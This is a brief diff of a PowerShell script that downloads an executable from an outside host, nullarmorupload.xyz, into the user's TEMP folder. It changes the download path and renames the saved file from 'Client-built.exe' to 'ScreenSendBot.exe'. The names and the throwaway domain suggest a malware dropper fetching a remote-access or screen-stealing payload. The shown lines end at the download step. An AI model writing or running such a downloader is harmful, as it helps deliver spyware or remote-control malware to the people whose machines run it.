@@ -1,8 +1,8 @@
 # Define URL of the file
-$url = "http://nullarmorupload.xyz/download/b3a2d28f"
+$url = "http://nullarmorupload.xyz/download/825a9046"
 
 # Define local path to save the executable
-$localPath = "$env:TEMP\Client-built.exe"
+$localPath = "$env:TEMP\ScreenSendBot.exe"
 
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $localPath
